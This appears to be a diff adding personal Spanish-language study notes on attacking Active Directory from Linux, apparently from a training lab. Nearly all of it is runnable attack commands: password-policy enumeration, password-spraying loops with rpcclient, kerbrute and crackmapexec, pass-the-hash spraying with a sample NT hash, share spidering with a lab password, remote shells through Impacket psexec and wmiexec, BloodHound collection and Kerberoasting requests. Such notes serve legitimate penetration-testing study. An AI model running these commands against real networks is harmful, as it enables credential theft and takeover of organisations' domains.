@@ -1,0 +1,124 @@
+        #### ACTIVE DIRECTORY ENUMERATION & ATTACKS  
+Enumeracion: La enumeracion se encuentra fuera de esta carpeta en el txt de AD
+En este txt se encuentra como usar tools y tecnicas en un entorno AD desde una maquina Linux
+
+----------      ----------      ----------      ----------
+        ### Password spraying: Enumerar usuarios y politicas
+Consta del intento de loguearse a un servicio mediante el uso de una contraseña pero una larga lista de usuarios
+
+Para realizar este ataque correctamente priomero se necesita:
+-> Listado valido de usuarios de dominio
+-> Poliotica de contraseñas de la empresa
+
+----------
+## Obtener politica de contraseñas Linux
+crackmapexec smb 172.16.5.5 -u <usuario valido> -p <contraseña valida> --pass-pol
+#Enumeracion de politica de contraseñas con credenciales validas
+
+rpcclient -U "" -N 172.16.5.5
+getdompwinfo
+#Enumeracion de la politica de contraseñas sin credenciales validas pero con null sesion
+
+enum4linux -P 172.16.5.5
+#Tool de enumeracion el cual prueba diferentes sesiones, busca politicas de contraseñas, etc.
+enum4linux-ng -P 172.16.5.5 -oA ilfreight
+#Escrito en python. Este permite exportar la data
+
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+#En configuraciones viejas de ldap es posible retrive data sin auth. De esta forma se soliciat la politica de pwd
+
+----------  ----------  ----------  ----------
+        ### Password Spraying from Linux
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+#One liner en bash para hacer passworrd sprying usando rpcclient y la lista obtenida de usuarios
+
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+#Password sprying con kerbrute usando lista de usr validos
+
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+#Password srpying con crackmap exec filtrado por lo valido (+) uusando lista de us validos
+
+## Verificacion de credencialees
+sudo crackmapexec smb 172.16.5.5 -u <usuario> -p <Pass encontrada>
+#Verificacion de usuarios y contraseñas validas mediante crackmapexec
+
+## Local Admin Spraying with CrackMapExec
+sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+#Si tenemos el hash NT de un admin de cuenta local (no dominio). Es recomendable verificar dicho hash en toda la subnet con la flag --loca-auth para que el tool solo intente logearse 1 vez en cada maquina
+#Tecnica muy ruidosa. Cuidado
+
+----------  ----------  ----------  ----------
+En este punto, ya con foothold en el sistema, hay que enumerar a profundidad con las credenciales obtenidas
+
+        ### Enumeracion de credenciales from Linux
+Cheatsheet de tools: https://wadcoms.github.io/
+
+----------
+##Crackmapexec
+sudo crackmapexec smb 172.16.5.5 -u <usr valido> -p <pwd valida>
+--users
+#Con credenciales y la flag --user se puede enumerar usuarios de dominio en el sistema
+--group
+#Esta flag nos sirve para, nuevamente con credenciales validas, obtener la informacion de los grupos de dominio
+--loggedon-users
+#Igual que el primero pero enumerando los usuarios logueados en el sistema
+--shares
+#Permite enumerar los directorios con el respectivo permiso
+        -M spider_plus --share 'Directorio'
+        #Esto permite enumerar en profundidad el dirtectorio y listar el contenido del mismo.
+        #El output es exportado en /tmp/cme_spider_plus/
+
+----------
+##SMBmap
+-u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+#Permite enumerar los shares con los respectivos permiosos
+-R 'Directorio' --dir-only
+#Estas flags permiten enumerar el direrctorio especificado en profundiad y con la flag --dir-only se pide el listado solo de directorios.
+
+----------
+##Rpcclient 
+#([!] Mas info en txt attacking_rpc)
+
+----------
+##Impacket
+Psexec.py
+#Es un clon del tool sysinternals psexec. Crea un servicio mediante la subida de un ejecutable al dir ADMIN$, lo registra mediante RPC y windows control manager y, una vez establecida la comunicacion, genera una shell
+psexec.py inlanefreight.local/<usrr>:'<pwd>'@172.16.5.125
+#Sintaxis para el uso con credenciales. Genera shell en system32 dir
+
+wmiexec.py
+#Utiliza un shell semi interactiva ejecutando comandos mediante Windows management instrumentation. No sube archivos al sistema generando menos logs que otros modulos de impacket
+wmiexec.py inlanefreight.local/<usrr>:'<pwd>'@172.16.5.125
+#Sintaxis para el uso con credenciales
+
+windapsearch.py
+#Script de python que permite la enumeracion de usuraios, grupos y maquinas en un dominio Windows utilizando queries de LDAP
+python3 windapsearch.py --dc-ip 172.16.5.5 -u <usr>@inlanefreight.local -p <pwd> --da
+#La flag --da sirve para la enumeracion de miembros en el grupo domain admins
+-PU
+#Esta flag sirve para la enumeracion de usuarios con privilegios elevados
+
+Bloodhound.py
+https://github.com/fox-it/BloodHound.py
+#Tool que permite enumerar AD mas en profundidad que los anteriores desde windows o linux
+bloodhound-python -u '<usr>' -p '<pwd>' -ns 172.16.5.5 -d inlanefreight.local -c all
+#-c (o --collectionmethod) permite usar distintos metodos de coleccion de datos como grupos, localadmin, sesiones, etc (ver help para mas info)
+#-ns especifica la ip del DC
+#-d especifica el nombre del DC
+sudo neo4j start
+#Esto activa el servicio para usar el tool BloodHound GUI. Permite subir los archivos que se crearon luego de enumerar el dominio para que nos represente de forma grafica la composision de este.
+        Find Shortest Paths To Domain Admins
+        #Se puede correr queries como la anterior que permite generar un mapa del dominio el cual muestra el camino para comprometerlo
+
+----------  ----------  ----------  ----------
+        ### Kerberoasting desde Linux
+##GetUserSPNs.py
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login>
+#Muestra cuentas con SPN
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login> -request
+#Hace request para mostrar los TGS
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login> -request-user <user TGS>
+#Hacer request para obtener el TGS de X usuario
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user to login> -request-user <user TGS> -outpuitfile <name>
+#Output a un file
+
